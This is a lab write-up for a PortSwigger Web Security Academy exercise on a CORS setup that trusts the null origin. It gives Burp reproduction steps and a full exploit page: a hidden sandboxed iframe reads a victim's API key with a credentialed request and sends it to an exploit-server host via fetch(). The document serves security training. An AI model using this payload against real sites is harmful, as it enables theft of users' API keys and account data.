# CORS vulnerability with trusted null origin

## Description

[This website](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack) has an insecure CORS configuration in that it trusts the `null` origin.  

## Reproduction and proof of concept

1. Start Burp, foxyproxy, and with intercept off, log in to `wiener:peter` on the target site and access the account page.
2. In Burp, review the **HTTPhistory**. The API key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
3. Analysis:
* Browsers will never send cookies if wildcard origins are used, regardless of the content of the `Access-Control-Allow-Credentials` header. The inclusion of the session cookies in the request, so wildcard origins can not be abused here.
* Null origin allows access to the response if the `Access-Control-Allow-Credentials` header is set to true.
4. Send the request to **Burp Repeater**, and resubmit it with the added header `Origin: null`. Check that the `null` origin is reflected in the `Access-Control-Allow-Origin` header of the response.

Took a break. Timed out. `lab-id` change.

5. Create exploit (replacing `lab-id` and `exploit-server-id`). The [iframe sandbox generates a null origin request](https://webdbg.com/test/sandbox/frames.htm).

```text
<html>
    <body>
        <iframe style="display:none" sandbox="allow-scripts" srcdoc="<script>
            var req = new XMLHttpRequest();
            var url = 'https://lab-id.web-security-academy.net/'
            
            req.onreadystatechange = function () {
                if (req.readyState == XMLHttpRequest.DONE) {
                    fetch('https://exploit-server-id/log/key=' + req.responseText)
                }
            };
            
            req.open('get', url + 'accountDetails',true);
            req.withCredentials = true;
            req.send(null);
        </script>"></iframe>
    </body>
</html>
```

5. Go to the exploit server and enter the exploit in the body field of the form.
6. Click **View exploit** and check you land on the log page and check the API key of the current account is in the URL.

7. **Deliver exploit to victim**.
8. Go to **Access log**

9. Copy the administrator's API key, and enter it as solution to the lab.

## Exploitability

An attacker needs to craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to the exploit server.
